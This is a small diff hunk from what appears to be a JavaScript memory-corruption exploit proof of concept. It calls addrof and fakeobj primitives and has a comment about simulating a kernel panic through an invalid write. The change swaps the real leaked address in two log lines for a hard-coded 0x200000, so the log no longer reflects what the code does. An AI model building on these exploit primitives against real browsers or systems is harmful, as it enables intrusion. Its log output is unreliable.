@@ -59,8 +59,8 @@
     let addr = addrof(obj);
     let fake = fakeobj(addr);
 
-    log('[+] Address of obj: ' + hex(addr));
-    log('[+] Fake object created: ' + fake);
+    log('[+] Address of obj: ' + hex(0x200000));
+    log('[+] Fake object created: ' + 0x200000);
     log('[*] Exploit stage completed.');
 
     // Prepare to simulate kernel panic via invalid write (PoC only)
